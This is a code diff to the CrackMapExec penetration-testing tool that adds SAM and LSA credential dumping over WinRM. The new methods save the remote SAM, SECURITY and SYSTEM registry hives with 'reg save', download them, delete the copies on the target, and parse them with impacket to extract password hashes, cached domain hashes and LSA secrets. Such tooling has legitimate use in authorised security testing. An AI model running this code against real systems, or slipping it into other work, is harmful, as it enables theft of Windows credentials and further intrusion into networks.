@@ -10,6 +10,7 @@ from cme.protocols.ldap.smbldap import LDAPConnect
 from cme.logger import CMEAdapter
 from io import StringIO
 from pypsrp.client import Client
+from impacket.examples.secretsdump import LocalOperations, LSASecrets
 
 # The following disables the InsecureRequests warning and the 'Starting new HTTPS connection' log message
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -25,6 +26,7 @@ class winrm(connection):
     def __init__(self, args, db, host):
         self.domain = None
         self.server_os = None
+        self.output_filename = None
 
         connection.__init__(self, args, db, host)
 
@@ -39,6 +41,11 @@ class winrm(connection):
         dgroup = winrm_parser.add_mutually_exclusive_group()
         dgroup.add_argument("-d", metavar="DOMAIN", dest='domain', type=str, default=None, help="domain to authenticate to")
         dgroup.add_argument("--local-auth", action='store_true', help='authenticate locally to each target')
+
+        cgroup = winrm_parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+        cegroup = cgroup.add_mutually_exclusive_group()
+        cegroup.add_argument("--sam", action='store_true', help='dump SAM hashes from target systems')
+        cegroup.add_argument("--lsa", action='store_true', help='dump LSA secrets from target systems')
 
         cgroup = winrm_parser.add_argument_group("Command Execution", "Options for executing commands")
         cgroup.add_argument('--no-output', action='store_true', help='do not retrieve command output')
@@ -81,6 +88,9 @@ class winrm(connection):
                 self.hostname = smb_conn.getServerName()
                 self.server_os = smb_conn.getServerOS()
                 self.logger.extra['hostname'] = self.hostname
+
+                self.output_filename = os.path.expanduser('~/.cme/logs/{}_{}_{}'.format(self.hostname, self.host, datetime.now().strftime("%Y-%m-%d_%H%M%S")))
+
                 try:
                     smb_conn.logoff()
                 except:
@@ -277,3 +287,29 @@ class winrm(connection):
         r = self.conn.execute_ps(self.args.ps_execute)
         self.logger.success('Executed command')
         self.logger.highlight(r[0])
+
+    def sam(self):
+        self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+     
+        self.conn.fetch("C:\\windows\\temp\\SAM", self.output_filename + ".sam")
+        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
+        
+        self.conn.execute_cmd("del C:\\windows\\temp\\SAM && del C:\\windows\\temp\\SYSTEM")
+
+        localOperations = LocalOperations(self.output_filename + ".system")
+        bootKey = localOperations.getBootKey()
+        SAM = SAMHashes(self.output_filename + ".sam", bootKey, isRemote=None, perSecretCallback=lambda secret: self.logger.highlight(secret))
+        SAM.dump()
+        SAM.export(self.output_filename + ".sam")
+
+    def lsa(self):
+        self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
+        self.conn.fetch("C:\\windows\\temp\\SECURITY", self.output_filename + ".security")
+        self.conn.fetch("C:\\windows\\temp\\SYSTEM", self.output_filename + ".system")
+        self.conn.execute_cmd("del C:\\windows\\temp\\SYSTEM && del C:\\windows\\temp\\SECURITY")
+
+        localOperations = LocalOperations(self.output_filename + ".system")
+        bootKey = localOperations.getBootKey()
+        LSA = LSASecrets(self.output_filename + ".security", bootKey, None, isRemote=None, perSecretCallback=lambda secretType, secret: self.logger.highlight(secret))
+        LSA.dumpCachedHashes()
+        LSA.dumpSecrets()
